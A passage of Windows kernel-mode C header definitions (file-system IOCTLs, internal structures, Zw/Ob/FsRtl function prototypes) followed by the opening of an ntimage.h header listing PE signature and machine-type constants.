#endif /* (NTDDI_VERSION >= NTDDI_WIN7) */

#define PIN_WAIT                        (1)
#define PIN_EXCLUSIVE                   (2)
#define PIN_NO_READ                     (4)
#define PIN_IF_BCB                      (8)
#define PIN_CALLER_TRACKS_DIRTY_DATA    (32)
#define PIN_HIGH_PRIORITY               (64)

#define MAP_WAIT                        1
#define MAP_NO_READ                     (16)
#define MAP_HIGH_PRIORITY               (64)

#define IOCTL_REDIR_QUERY_PATH          CTL_CODE(FILE_DEVICE_NETWORK_FILE_SYSTEM, 99, METHOD_NEITHER, FILE_ANY_ACCESS)
#define IOCTL_REDIR_QUERY_PATH_EX       CTL_CODE(FILE_DEVICE_NETWORK_FILE_SYSTEM, 100, METHOD_NEITHER, FILE_ANY_ACCESS)

typedef struct _QUERY_PATH_REQUEST {
  ULONG PathNameLength;
  PIO_SECURITY_CONTEXT SecurityContext;
  WCHAR FilePathName[1];
} QUERY_PATH_REQUEST, *PQUERY_PATH_REQUEST;

typedef struct _QUERY_PATH_REQUEST_EX {
  PIO_SECURITY_CONTEXT pSecurityContext;
  ULONG EaLength;
  PVOID pEaBuffer;
  UNICODE_STRING PathName;
  UNICODE_STRING DomainServiceName;
  ULONG_PTR Reserved[ 3 ];
} QUERY_PATH_REQUEST_EX, *PQUERY_PATH_REQUEST_EX;

typedef struct _QUERY_PATH_RESPONSE {
  ULONG LengthAccepted;
} QUERY_PATH_RESPONSE, *PQUERY_PATH_RESPONSE;

#define VOLSNAPCONTROLTYPE                              0x00000053
#define IOCTL_VOLSNAP_FLUSH_AND_HOLD_WRITES             CTL_CODE(VOLSNAPCONTROLTYPE, 0, METHOD_BUFFERED, FILE_READ_ACCESS | FILE_WRITE_ACCESS)

/* FIXME : These definitions below don't belong here (or anywhere in ddk really) */
#pragma pack(push,4)

#ifndef VER_PRODUCTBUILD
#define VER_PRODUCTBUILD 10000
#endif

#include "csq.h"

extern PACL                         SePublicDefaultDacl;
extern PACL                         SeSystemDefaultDacl;

#define FS_LFN_APIS                             0x00004000

#define FILE_STORAGE_TYPE_SPECIFIED             0x00000041  /* FILE_DIRECTORY_FILE | FILE_NON_DIRECTORY_FILE */
#define FILE_STORAGE_TYPE_DEFAULT               (StorageTypeDefault << FILE_STORAGE_TYPE_SHIFT)
#define FILE_STORAGE_TYPE_DIRECTORY             (StorageTypeDirectory << FILE_STORAGE_TYPE_SHIFT)
#define FILE_STORAGE_TYPE_FILE                  (StorageTypeFile << FILE_STORAGE_TYPE_SHIFT)
#define FILE_STORAGE_TYPE_DOCFILE               (StorageTypeDocfile << FILE_STORAGE_TYPE_SHIFT)
#define FILE_STORAGE_TYPE_JUNCTION_POINT        (StorageTypeJunctionPoint << FILE_STORAGE_TYPE_SHIFT)
#define FILE_STORAGE_TYPE_CATALOG               (StorageTypeCatalog << FILE_STORAGE_TYPE_SHIFT)
#define FILE_STORAGE_TYPE_STRUCTURED_STORAGE    (StorageTypeStructuredStorage << FILE_STORAGE_TYPE_SHIFT)
#define FILE_STORAGE_TYPE_EMBEDDING             (StorageTypeEmbedding << FILE_STORAGE_TYPE_SHIFT)
#define FILE_STORAGE_TYPE_STREAM                (StorageTypeStream << FILE_STORAGE_TYPE_SHIFT)
#define FILE_MINIMUM_STORAGE_TYPE               FILE_STORAGE_TYPE_DEFAULT
#define FILE_MAXIMUM_STORAGE_TYPE               FILE_STORAGE_TYPE_STREAM
#define FILE_STORAGE_TYPE_MASK                  0x000f0000
#define FILE_STORAGE_TYPE_SHIFT                 16

#define FILE_VC_QUOTAS_LOG_VIOLATIONS           0x00000004

#ifdef _X86_
#define HARDWARE_PTE    HARDWARE_PTE_X86
#define PHARDWARE_PTE   PHARDWARE_PTE_X86
#endif

#define IO_ATTACH_DEVICE_API            0x80000000

#define IO_TYPE_APC                     18
#define IO_TYPE_DPC                     19
#define IO_TYPE_DEVICE_QUEUE            20
#define IO_TYPE_EVENT_PAIR              21
#define IO_TYPE_INTERRUPT               22
#define IO_TYPE_PROFILE                 23

#define IRP_BEING_VERIFIED              0x10

#define MAILSLOT_CLASS_FIRSTCLASS       1
#define MAILSLOT_CLASS_SECONDCLASS      2

#define MAILSLOT_SIZE_AUTO              0

#define MEM_DOS_LIM                     0x40000000

#define OB_TYPE_TYPE                    1
#define OB_TYPE_DIRECTORY               2
#define OB_TYPE_SYMBOLIC_LINK           3
#define OB_TYPE_TOKEN                   4
#define OB_TYPE_PROCESS                 5
#define OB_TYPE_THREAD                  6
#define OB_TYPE_EVENT                   7
#define OB_TYPE_EVENT_PAIR              8
#define OB_TYPE_MUTANT                  9
#define OB_TYPE_SEMAPHORE               10
#define OB_TYPE_TIMER                   11
#define OB_TYPE_PROFILE                 12
#define OB_TYPE_WINDOW_STATION          13
#define OB_TYPE_DESKTOP                 14
#define OB_TYPE_SECTION                 15
#define OB_TYPE_KEY                     16
#define OB_TYPE_PORT                    17
#define OB_TYPE_ADAPTER                 18
#define OB_TYPE_CONTROLLER              19
#define OB_TYPE_DEVICE                  20
#define OB_TYPE_DRIVER                  21
#define OB_TYPE_IO_COMPLETION           22
#define OB_TYPE_FILE                    23

#define SEC_BASED 0x00200000

/* end winnt.h */

#define TOKEN_HAS_ADMIN_GROUP           0x08

#if (VER_PRODUCTBUILD >= 1381)
#define FSCTL_GET_HFS_INFORMATION       CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 31, METHOD_BUFFERED, FILE_ANY_ACCESS)
#endif /* (VER_PRODUCTBUILD >= 1381) */

#if (VER_PRODUCTBUILD >= 2195)

#define FSCTL_READ_PROPERTY_DATA        CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 33, METHOD_NEITHER, FILE_ANY_ACCESS)
#define FSCTL_WRITE_PROPERTY_DATA       CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 34, METHOD_NEITHER, FILE_ANY_ACCESS)

#define FSCTL_DUMP_PROPERTY_DATA        CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 37,  METHOD_NEITHER, FILE_ANY_ACCESS)

#define FSCTL_HSM_MSG                   CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 66, METHOD_BUFFERED, FILE_READ_DATA | FILE_WRITE_DATA)
#define FSCTL_NSS_CONTROL               CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 67, METHOD_BUFFERED, FILE_WRITE_DATA)
#define FSCTL_HSM_DATA                  CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 68, METHOD_NEITHER, FILE_READ_DATA | FILE_WRITE_DATA)
#define FSCTL_NSS_RCONTROL              CTL_CODE(FILE_DEVICE_FILE_SYSTEM, 70, METHOD_BUFFERED, FILE_READ_DATA)
#endif /* (VER_PRODUCTBUILD >= 2195) */

#define FSCTL_NETWORK_SET_CONFIGURATION_INFO    CTL_CODE(FILE_DEVICE_NETWORK_FILE_SYSTEM, 102, METHOD_IN_DIRECT, FILE_ANY_ACCESS)
#define FSCTL_NETWORK_GET_CONFIGURATION_INFO    CTL_CODE(FILE_DEVICE_NETWORK_FILE_SYSTEM, 103, METHOD_OUT_DIRECT, FILE_ANY_ACCESS)
#define FSCTL_NETWORK_GET_CONNECTION_INFO       CTL_CODE(FILE_DEVICE_NETWORK_FILE_SYSTEM, 104, METHOD_NEITHER, FILE_ANY_ACCESS)
#define FSCTL_NETWORK_ENUMERATE_CONNECTIONS     CTL_CODE(FILE_DEVICE_NETWORK_FILE_SYSTEM, 105, METHOD_NEITHER, FILE_ANY_ACCESS)
#define FSCTL_NETWORK_DELETE_CONNECTION         CTL_CODE(FILE_DEVICE_NETWORK_FILE_SYSTEM, 107, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_NETWORK_GET_STATISTICS            CTL_CODE(FILE_DEVICE_NETWORK_FILE_SYSTEM, 116, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_NETWORK_SET_DOMAIN_NAME           CTL_CODE(FILE_DEVICE_NETWORK_FILE_SYSTEM, 120, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define FSCTL_NETWORK_REMOTE_BOOT_INIT_SCRT     CTL_CODE(FILE_DEVICE_NETWORK_FILE_SYSTEM, 250, METHOD_BUFFERED, FILE_ANY_ACCESS)

typedef enum _FILE_STORAGE_TYPE {
    StorageTypeDefault = 1,
    StorageTypeDirectory,
    StorageTypeFile,
    StorageTypeJunctionPoint,
    StorageTypeCatalog,
    StorageTypeStructuredStorage,
    StorageTypeEmbedding,
    StorageTypeStream
} FILE_STORAGE_TYPE;

typedef struct _OBJECT_BASIC_INFORMATION
{
    ULONG Attributes;
    ACCESS_MASK GrantedAccess;
    ULONG HandleCount;
    ULONG PointerCount;
    ULONG PagedPoolCharge;
    ULONG NonPagedPoolCharge;
    ULONG Reserved[ 3 ];
    ULONG NameInfoSize;
    ULONG TypeInfoSize;
    ULONG SecurityDescriptorSize;
    LARGE_INTEGER CreationTime;
} OBJECT_BASIC_INFORMATION, *POBJECT_BASIC_INFORMATION;

typedef struct _BITMAP_RANGE {
    LIST_ENTRY      Links;
    LONGLONG        BasePage;
    ULONG           FirstDirtyPage;
    ULONG           LastDirtyPage;
    ULONG           DirtyPages;
    PULONG          Bitmap;
} BITMAP_RANGE, *PBITMAP_RANGE;

typedef struct _FILE_COPY_ON_WRITE_INFORMATION {
    BOOLEAN ReplaceIfExists;
    HANDLE  RootDirectory;
    ULONG   FileNameLength;
    WCHAR   FileName[1];
} FILE_COPY_ON_WRITE_INFORMATION, *PFILE_COPY_ON_WRITE_INFORMATION;

typedef struct _FILE_FULL_DIRECTORY_INFORMATION {
    ULONG           NextEntryOffset;
    ULONG           FileIndex;
    LARGE_INTEGER   CreationTime;
    LARGE_INTEGER   LastAccessTime;
    LARGE_INTEGER   LastWriteTime;
    LARGE_INTEGER   ChangeTime;
    LARGE_INTEGER   EndOfFile;
    LARGE_INTEGER   AllocationSize;
    ULONG           FileAttributes;
    ULONG           FileNameLength;
    ULONG           EaSize;
    WCHAR           FileName[ANYSIZE_ARRAY];
} FILE_FULL_DIRECTORY_INFORMATION, *PFILE_FULL_DIRECTORY_INFORMATION;

/* raw internal file lock struct returned from FsRtlGetNextFileLock */
typedef struct _FILE_SHARED_LOCK_ENTRY {
    PVOID           Unknown1;
    PVOID           Unknown2;
    FILE_LOCK_INFO  FileLock;
} FILE_SHARED_LOCK_ENTRY, *PFILE_SHARED_LOCK_ENTRY;

/* raw internal file lock struct returned from FsRtlGetNextFileLock */
typedef struct _FILE_EXCLUSIVE_LOCK_ENTRY {
    LIST_ENTRY      ListEntry;
    PVOID           Unknown1;
    PVOID           Unknown2;
    FILE_LOCK_INFO  FileLock;
} FILE_EXCLUSIVE_LOCK_ENTRY, *PFILE_EXCLUSIVE_LOCK_ENTRY;

typedef struct _FILE_MAILSLOT_PEEK_BUFFER {
    ULONG ReadDataAvailable;
    ULONG NumberOfMessages;
    ULONG MessageLength;
} FILE_MAILSLOT_PEEK_BUFFER, *PFILE_MAILSLOT_PEEK_BUFFER;

typedef struct _FILE_OLE_CLASSID_INFORMATION {
    GUID ClassId;
} FILE_OLE_CLASSID_INFORMATION, *PFILE_OLE_CLASSID_INFORMATION;

typedef struct _FILE_OLE_ALL_INFORMATION {
    FILE_BASIC_INFORMATION          BasicInformation;
    FILE_STANDARD_INFORMATION       StandardInformation;
    FILE_INTERNAL_INFORMATION       InternalInformation;
    FILE_EA_INFORMATION             EaInformation;
    FILE_ACCESS_INFORMATION         AccessInformation;
    FILE_POSITION_INFORMATION       PositionInformation;
    FILE_MODE_INFORMATION           ModeInformation;
    FILE_ALIGNMENT_INFORMATION      AlignmentInformation;
    USN                             LastChangeUsn;
    USN                             ReplicationUsn;
    LARGE_INTEGER                   SecurityChangeTime;
    FILE_OLE_CLASSID_INFORMATION    OleClassIdInformation;
    FILE_OBJECTID_INFORMATION       ObjectIdInformation;
    FILE_STORAGE_TYPE               StorageType;
    ULONG                           OleStateBits;
    ULONG                           OleId;
    ULONG                           NumberOfStreamReferences;
    ULONG                           StreamIndex;
    ULONG                           SecurityId;
    BOOLEAN                         ContentIndexDisable;
    BOOLEAN                         InheritContentIndexDisable;
    FILE_NAME_INFORMATION           NameInformation;
} FILE_OLE_ALL_INFORMATION, *PFILE_OLE_ALL_INFORMATION;

typedef struct _FILE_OLE_DIR_INFORMATION {
    ULONG               NextEntryOffset;
    ULONG               FileIndex;
    LARGE_INTEGER       CreationTime;
    LARGE_INTEGER       LastAccessTime;
    LARGE_INTEGER       LastWriteTime;
    LARGE_INTEGER       ChangeTime;
    LARGE_INTEGER       EndOfFile;
    LARGE_INTEGER       AllocationSize;
    ULONG               FileAttributes;
    ULONG               FileNameLength;
    FILE_STORAGE_TYPE   StorageType;
    GUID                OleClassId;
    ULONG               OleStateBits;
    BOOLEAN             ContentIndexDisable;
    BOOLEAN             InheritContentIndexDisable;
    WCHAR               FileName[1];
} FILE_OLE_DIR_INFORMATION, *PFILE_OLE_DIR_INFORMATION;

typedef struct _FILE_OLE_INFORMATION {
    LARGE_INTEGER                   SecurityChangeTime;
    FILE_OLE_CLASSID_INFORMATION    OleClassIdInformation;
    FILE_OBJECTID_INFORMATION       ObjectIdInformation;
    FILE_STORAGE_TYPE               StorageType;
    ULONG                           OleStateBits;
    BOOLEAN                         ContentIndexDisable;
    BOOLEAN                         InheritContentIndexDisable;
} FILE_OLE_INFORMATION, *PFILE_OLE_INFORMATION;

typedef struct _FILE_OLE_STATE_BITS_INFORMATION {
    ULONG StateBits;
    ULONG StateBitsMask;
} FILE_OLE_STATE_BITS_INFORMATION, *PFILE_OLE_STATE_BITS_INFORMATION;

typedef struct _MAPPING_PAIR {
    ULONGLONG Vcn;
    ULONGLONG Lcn;
} MAPPING_PAIR, *PMAPPING_PAIR;

typedef struct _GET_RETRIEVAL_DESCRIPTOR {
    ULONG           NumberOfPairs;
    ULONGLONG       StartVcn;
    MAPPING_PAIR    Pair[1];
} GET_RETRIEVAL_DESCRIPTOR, *PGET_RETRIEVAL_DESCRIPTOR;

typedef struct _MBCB {
    CSHORT          NodeTypeCode;
    CSHORT          NodeIsInZone;
    ULONG           PagesToWrite;
    ULONG           DirtyPages;
    ULONG           Reserved;
    LIST_ENTRY      BitmapRanges;
    LONGLONG        ResumeWritePage;
    BITMAP_RANGE    BitmapRange1;
    BITMAP_RANGE    BitmapRange2;
    BITMAP_RANGE    BitmapRange3;
} MBCB, *PMBCB;

typedef struct _MOVEFILE_DESCRIPTOR {
     HANDLE         FileHandle;
     ULONG          Reserved;
     LARGE_INTEGER  StartVcn;
     LARGE_INTEGER  TargetLcn;
     ULONG          NumVcns;
     ULONG          Reserved1;
} MOVEFILE_DESCRIPTOR, *PMOVEFILE_DESCRIPTOR;

typedef struct _OBJECT_BASIC_INFO {
    ULONG           Attributes;
    ACCESS_MASK     GrantedAccess;
    ULONG           HandleCount;
    ULONG           ReferenceCount;
    ULONG           PagedPoolUsage;
    ULONG           NonPagedPoolUsage;
    ULONG           Reserved[3];
    ULONG           NameInformationLength;
    ULONG           TypeInformationLength;
    ULONG           SecurityDescriptorLength;
    LARGE_INTEGER   CreateTime;
} OBJECT_BASIC_INFO, *POBJECT_BASIC_INFO;

typedef struct _OBJECT_HANDLE_ATTRIBUTE_INFO {
    BOOLEAN Inherit;
    BOOLEAN ProtectFromClose;
} OBJECT_HANDLE_ATTRIBUTE_INFO, *POBJECT_HANDLE_ATTRIBUTE_INFO;

typedef struct _OBJECT_NAME_INFO {
    UNICODE_STRING  ObjectName;
    WCHAR           ObjectNameBuffer[1];
} OBJECT_NAME_INFO, *POBJECT_NAME_INFO;

typedef struct _OBJECT_PROTECTION_INFO {
    BOOLEAN Inherit;
    BOOLEAN ProtectHandle;
} OBJECT_PROTECTION_INFO, *POBJECT_PROTECTION_INFO;

typedef struct _OBJECT_TYPE_INFO {
    UNICODE_STRING  ObjectTypeName;
    UCHAR           Unknown[0x58];
    WCHAR           ObjectTypeNameBuffer[1];
} OBJECT_TYPE_INFO, *POBJECT_TYPE_INFO;

typedef struct _OBJECT_ALL_TYPES_INFO {
    ULONG               NumberOfObjectTypes;
    OBJECT_TYPE_INFO    ObjectsTypeInfo[1];
} OBJECT_ALL_TYPES_INFO, *POBJECT_ALL_TYPES_INFO;

#if defined(USE_LPC6432)
#define LPC_CLIENT_ID CLIENT_ID64
#define LPC_SIZE_T ULONGLONG
#define LPC_PVOID ULONGLONG
#define LPC_HANDLE ULONGLONG
#else
#define LPC_CLIENT_ID CLIENT_ID
#define LPC_SIZE_T SIZE_T
#define LPC_PVOID PVOID
#define LPC_HANDLE HANDLE
#endif

typedef struct _PORT_MESSAGE
{
    union
    {
        struct
        {
            CSHORT DataLength;
            CSHORT TotalLength;
        } s1;
        ULONG Length;
    } u1;
    union
    {
        struct
        {
            CSHORT Type;
            CSHORT DataInfoOffset;
        } s2;
        ULONG ZeroInit;
    } u2;
    __GNU_EXTENSION union
    {
        LPC_CLIENT_ID ClientId;
        double DoNotUseThisField;
    };
    ULONG MessageId;
    __GNU_EXTENSION union
    {
        LPC_SIZE_T ClientViewSize;
        ULONG CallbackId;
    };
} PORT_MESSAGE, *PPORT_MESSAGE;

#define LPC_KERNELMODE_MESSAGE      (CSHORT)((USHORT)0x8000)

typedef struct _PORT_VIEW
{
    ULONG Length;
    LPC_HANDLE SectionHandle;
    ULONG SectionOffset;
    LPC_SIZE_T ViewSize;
    LPC_PVOID ViewBase;
    LPC_PVOID ViewRemoteBase;
} PORT_VIEW, *PPORT_VIEW;

typedef struct _REMOTE_PORT_VIEW
{
    ULONG Length;
    LPC_SIZE_T ViewSize;
    LPC_PVOID ViewBase;
} REMOTE_PORT_VIEW, *PREMOTE_PORT_VIEW;

typedef struct _VAD_HEADER {
    PVOID       StartVPN;
    PVOID       EndVPN;
    struct _VAD_HEADER* ParentLink;
    struct _VAD_HEADER* LeftLink;
    struct _VAD_HEADER* RightLink;
    ULONG       Flags;          /* LSB = CommitCharge */
    PVOID       ControlArea;
    PVOID       FirstProtoPte;
    PVOID       LastPTE;
    ULONG       Unknown;
    LIST_ENTRY  Secured;
} VAD_HEADER, *PVAD_HEADER;

NTKERNELAPI
LARGE_INTEGER
NTAPI
CcGetLsnForFileObject (
    IN PFILE_OBJECT     FileObject,
    OUT PLARGE_INTEGER  OldestLsn OPTIONAL
);

NTKERNELAPI
PVOID
NTAPI
FsRtlAllocatePool (
    IN POOL_TYPE    PoolType,
    IN ULONG        NumberOfBytes
);

NTKERNELAPI
PVOID
NTAPI
FsRtlAllocatePoolWithQuota (
    IN POOL_TYPE    PoolType,
    IN ULONG        NumberOfBytes
);

NTKERNELAPI
PVOID
NTAPI
FsRtlAllocatePoolWithQuotaTag (
    IN POOL_TYPE    PoolType,
    IN ULONG        NumberOfBytes,
    IN ULONG        Tag
);

NTKERNELAPI
PVOID
NTAPI
FsRtlAllocatePoolWithTag (
    IN POOL_TYPE    PoolType,
    IN ULONG        NumberOfBytes,
    IN ULONG        Tag
);

NTKERNELAPI
BOOLEAN
NTAPI
FsRtlIsFatDbcsLegal (
    IN ANSI_STRING  DbcsName,
    IN BOOLEAN      WildCardsPermissible,
    IN BOOLEAN      PathNamePermissible,
    IN BOOLEAN      LeadingBackslashPermissible
);

NTKERNELAPI
BOOLEAN
NTAPI
FsRtlMdlReadComplete (
    IN PFILE_OBJECT     FileObject,
    IN PMDL             MdlChain
);

NTKERNELAPI
BOOLEAN
NTAPI
FsRtlMdlWriteComplete (
    IN PFILE_OBJECT     FileObject,
    IN PLARGE_INTEGER   FileOffset,
    IN PMDL             MdlChain
);

NTKERNELAPI
VOID
NTAPI
FsRtlNotifyChangeDirectory (
    IN PNOTIFY_SYNC NotifySync,
    IN PVOID        FsContext,
    IN PSTRING      FullDirectoryName,
    IN PLIST_ENTRY  NotifyList,
    IN BOOLEAN      WatchTree,
    IN ULONG        CompletionFilter,
    IN PIRP         NotifyIrp
);

NTKERNELAPI
NTSTATUS
NTAPI
ObCreateObject (
    IN KPROCESSOR_MODE      ObjectAttributesAccessMode OPTIONAL,
    IN POBJECT_TYPE         ObjectType,
    IN POBJECT_ATTRIBUTES   ObjectAttributes OPTIONAL,
    IN KPROCESSOR_MODE      AccessMode,
    IN OUT PVOID            ParseContext OPTIONAL,
    IN ULONG                ObjectSize,
    IN ULONG                PagedPoolCharge OPTIONAL,
    IN ULONG                NonPagedPoolCharge OPTIONAL,
    OUT PVOID               *Object
);

NTKERNELAPI
ULONG
NTAPI
ObGetObjectPointerCount (
    IN PVOID Object
);

NTKERNELAPI
NTSTATUS
NTAPI
ObReferenceObjectByName (
    IN PUNICODE_STRING  ObjectName,
    IN ULONG            Attributes,
    IN PACCESS_STATE    PassedAccessState OPTIONAL,
    IN ACCESS_MASK      DesiredAccess OPTIONAL,
    IN POBJECT_TYPE     ObjectType,
    IN KPROCESSOR_MODE  AccessMode,
    IN OUT PVOID        ParseContext OPTIONAL,
    OUT PVOID           *Object
);

#define PsDereferenceImpersonationToken(T)  \
            {if (ARGUMENT_PRESENT(T)) {     \
                (ObDereferenceObject((T))); \
            } else {                        \
                ;                           \
            }                               \
}

NTKERNELAPI
NTSTATUS
NTAPI
PsLookupProcessThreadByCid (
    IN PCLIENT_ID   Cid,
    OUT PEPROCESS   *Process OPTIONAL,
    OUT PETHREAD    *Thread
);

NTSYSAPI
NTSTATUS
NTAPI
RtlSetSaclSecurityDescriptor (
    IN OUT PSECURITY_DESCRIPTOR SecurityDescriptor,
    IN BOOLEAN                  SaclPresent,
    IN PACL                     Sacl,
    IN BOOLEAN                  SaclDefaulted
);

#define SeEnableAccessToExports() SeExports = *(PSE_EXPORTS *)SeExports;

#if (VER_PRODUCTBUILD >= 2195)

NTSYSAPI
NTSTATUS
NTAPI
ZwAdjustPrivilegesToken (
    IN HANDLE               TokenHandle,
    IN BOOLEAN              DisableAllPrivileges,
    IN PTOKEN_PRIVILEGES    NewState,
    IN ULONG                BufferLength,
    OUT PTOKEN_PRIVILEGES   PreviousState OPTIONAL,
    OUT PULONG              ReturnLength
);

#endif /* (VER_PRODUCTBUILD >= 2195) */

NTSYSAPI
NTSTATUS
NTAPI
ZwAlertThread (
    IN HANDLE ThreadHandle
);

NTSYSAPI
NTSTATUS
NTAPI
ZwAccessCheckAndAuditAlarm (
    IN PUNICODE_STRING      SubsystemName,
    IN PVOID                HandleId,
    IN PUNICODE_STRING      ObjectTypeName,
    IN PUNICODE_STRING      ObjectName,
    IN PSECURITY_DESCRIPTOR SecurityDescriptor,
    IN ACCESS_MASK          DesiredAccess,
    IN PGENERIC_MAPPING     GenericMapping,
    IN BOOLEAN              ObjectCreation,
    OUT PACCESS_MASK        GrantedAccess,
    OUT PBOOLEAN            AccessStatus,
    OUT PBOOLEAN            GenerateOnClose
);

#if (VER_PRODUCTBUILD >= 2195)

NTSYSAPI
NTSTATUS
NTAPI
ZwCancelIoFile (
    IN HANDLE               FileHandle,
    OUT PIO_STATUS_BLOCK    IoStatusBlock
);

#endif /* (VER_PRODUCTBUILD >= 2195) */

NTSYSAPI
NTSTATUS
NTAPI
ZwClearEvent (
    IN HANDLE EventHandle
);

NTSYSAPI
NTSTATUS
NTAPI
ZwCloseObjectAuditAlarm (
    IN PUNICODE_STRING  SubsystemName,
    IN PVOID            HandleId,
    IN BOOLEAN          GenerateOnClose
);

NTSYSAPI
NTSTATUS
NTAPI
ZwCreateSymbolicLinkObject (
    OUT PHANDLE             SymbolicLinkHandle,
    IN ACCESS_MASK          DesiredAccess,
    IN POBJECT_ATTRIBUTES   ObjectAttributes,
    IN PUNICODE_STRING      TargetName
);

NTSYSAPI
NTSTATUS
NTAPI
ZwFlushInstructionCache (
    IN HANDLE   ProcessHandle,
    IN PVOID    BaseAddress OPTIONAL,
    IN ULONG    FlushSize
);

NTSYSAPI
NTSTATUS
NTAPI
ZwFlushBuffersFile(
    IN HANDLE FileHandle,
    OUT PIO_STATUS_BLOCK IoStatusBlock
);

#if (VER_PRODUCTBUILD >= 2195)

NTSYSAPI
NTSTATUS
NTAPI
ZwInitiatePowerAction (
    IN POWER_ACTION         SystemAction,
    IN SYSTEM_POWER_STATE   MinSystemState,
    IN ULONG                Flags,
    IN BOOLEAN              Asynchronous
);

#endif /* (VER_PRODUCTBUILD >= 2195) */

NTSYSAPI
NTSTATUS
NTAPI
ZwLoadKey (
    IN POBJECT_ATTRIBUTES KeyObjectAttributes,
    IN POBJECT_ATTRIBUTES FileObjectAttributes
);

NTSYSAPI
NTSTATUS
NTAPI
ZwOpenProcessToken (
    IN HANDLE       ProcessHandle,
    IN ACCESS_MASK  DesiredAccess,
    OUT PHANDLE     TokenHandle
);

NTSYSAPI
NTSTATUS
NTAPI
ZwOpenThread (
    OUT PHANDLE             ThreadHandle,
    IN ACCESS_MASK          DesiredAccess,
    IN POBJECT_ATTRIBUTES   ObjectAttributes,
    IN PCLIENT_ID           ClientId
);

NTSYSAPI
NTSTATUS
NTAPI
ZwOpenThreadToken (
    IN HANDLE       ThreadHandle,
    IN ACCESS_MASK  DesiredAccess,
    IN BOOLEAN      OpenAsSelf,
    OUT PHANDLE     TokenHandle
);

NTSYSAPI
NTSTATUS
NTAPI
ZwPulseEvent (
    IN HANDLE   EventHandle,
    OUT PLONG   PreviousState OPTIONAL
);

NTSYSAPI
NTSTATUS
NTAPI
ZwQueryDefaultLocale (
    IN BOOLEAN  ThreadOrSystem,
    OUT PLCID   Locale
);

#if (VER_PRODUCTBUILD >= 2195)

NTSYSAPI
NTSTATUS
NTAPI
ZwQueryDirectoryObject (
    IN HANDLE       DirectoryHandle,
    OUT PVOID       Buffer,
    IN ULONG        Length,
    IN BOOLEAN      ReturnSingleEntry,
    IN BOOLEAN      RestartScan,
    IN OUT PULONG   Context,
    OUT PULONG      ReturnLength OPTIONAL
);

#endif /* (VER_PRODUCTBUILD >= 2195) */

NTSYSAPI
NTSTATUS
NTAPI
ZwQueryInformationProcess (
    IN HANDLE           ProcessHandle,
    IN PROCESSINFOCLASS ProcessInformationClass,
    OUT PVOID           ProcessInformation,
    IN ULONG            ProcessInformationLength,
    OUT PULONG          ReturnLength OPTIONAL
);

NTSYSAPI
NTSTATUS
NTAPI
ZwReplaceKey (
    IN POBJECT_ATTRIBUTES   NewFileObjectAttributes,
    IN HANDLE               KeyHandle,
    IN POBJECT_ATTRIBUTES   OldFileObjectAttributes
);

NTSYSAPI
NTSTATUS
NTAPI
ZwResetEvent (
    IN HANDLE   EventHandle,
    OUT PLONG   PreviousState OPTIONAL
);

#if (VER_PRODUCTBUILD >= 2195)

NTSYSAPI
NTSTATUS
NTAPI
ZwRestoreKey (
    IN HANDLE   KeyHandle,
    IN HANDLE   FileHandle,
    IN ULONG    Flags
);

#endif /* (VER_PRODUCTBUILD >= 2195) */

NTSYSAPI
NTSTATUS
NTAPI
ZwSaveKey (
    IN HANDLE KeyHandle,
    IN HANDLE FileHandle
);

NTSYSAPI
NTSTATUS
NTAPI
ZwSetDefaultLocale (
    IN BOOLEAN  ThreadOrSystem,
    IN LCID     Locale
);

#if (VER_PRODUCTBUILD >= 2195)

NTSYSAPI
NTSTATUS
NTAPI
ZwSetDefaultUILanguage (
    IN LANGID LanguageId
);

#endif /* (VER_PRODUCTBUILD >= 2195) */

NTSYSAPI
NTSTATUS
NTAPI
ZwSetInformationProcess (
    IN HANDLE           ProcessHandle,
    IN PROCESSINFOCLASS ProcessInformationClass,
    IN PVOID            ProcessInformation,
    IN ULONG            ProcessInformationLength
);

NTSYSAPI
NTSTATUS
NTAPI
ZwSetSystemTime (
    IN PLARGE_INTEGER   NewTime,
    OUT PLARGE_INTEGER  OldTime OPTIONAL
);

NTSYSAPI
NTSTATUS
NTAPI
ZwUnloadKey (
    IN POBJECT_ATTRIBUTES KeyObjectAttributes
);

NTSYSAPI
NTSTATUS
NTAPI
ZwWaitForMultipleObjects (
    IN ULONG            HandleCount,
    IN PHANDLE          Handles,
    IN WAIT_TYPE        WaitType,
    IN BOOLEAN          Alertable,
    IN PLARGE_INTEGER   Timeout OPTIONAL
);

NTSYSAPI
NTSTATUS
NTAPI
ZwYieldExecution (
    VOID
);

#pragma pack(pop)

#ifdef __cplusplus
}
#endif

```

`include/ddk/ntimage.h`:

```h
#ifndef _NTIMAGE_
#define _NTIMAGE_

//
// Image Formats
//
#define IMAGE_DOS_SIGNATURE                 0x5A4D
#define IMAGE_OS2_SIGNATURE                 0x454E
#define IMAGE_OS2_SIGNATURE_LE              0x454C
#define IMAGE_VXD_SIGNATURE                 0x454C
#define IMAGE_NT_SIGNATURE                  0x00004550

//
// Image architectures
//
#define IMAGE_FILE_MACHINE_AM33       0x1d3
#define IMAGE_FILE_MACHINE_AMD64      0x8664
#define IMAGE_FILE_MACHINE_ARM        0x1c0
#define IMAGE_FILE_MACHINE_ARMV7      0x1c4
#define IMAGE_FILE_MACHINE_EBC        0xebc
#define IMAGE_FILE_MACHINE_I386       0x14c
#define IMAGE_FILE_MACHINE_IA64       0x200
#define IMAGE_FILE_MACHINE_M32R       0x9041
#define IMAGE_FILE_MACHINE_MIPS16     0x266
#define IMAGE_FILE_MACHINE_MIPSFPU    0x366
#define IMAGE_FILE_MACHINE_MIPSFPU16  0x466
#define IMAGE_FILE_MACHINE_POWERPC    0x1f0
#define IMAGE_FILE_MACHINE_POWERPCFP  0x1f1
#define IMAGE_FILE_MACHINE_R4000      0x166
#define IMAGE_FILE_MACHINE_SH3        0x1a2
#define IMAGE_FILE_MACHINE_SH3E       0x01a4
#define IMAGE_FILE_MACHINE_SH3DSP     0x1a3
#define IMAGE_FILE_MACHINE_SH4        0x1a6
#define IMAGE_FILE_MACHINE_SH5        0x1a8
#define IMAGE_FILE_MACHINE_THUMB      0x1c2
